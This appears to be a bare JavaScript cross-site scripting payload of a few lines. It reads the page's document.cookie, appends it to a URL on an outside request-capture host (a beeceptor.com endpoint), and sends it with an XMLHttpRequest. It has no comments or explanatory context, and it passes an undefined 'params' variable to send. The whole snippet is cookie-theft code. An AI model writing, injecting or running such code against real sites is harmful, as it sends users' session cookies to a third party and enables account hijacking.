var url = "https://llorave.free.beeceptor.com/my/api/path?cookie=";

url = url + document.cookie;

var xhr = new XMLHttpRequest();
xhr.open("GET", url, true);

xhr.send(params);
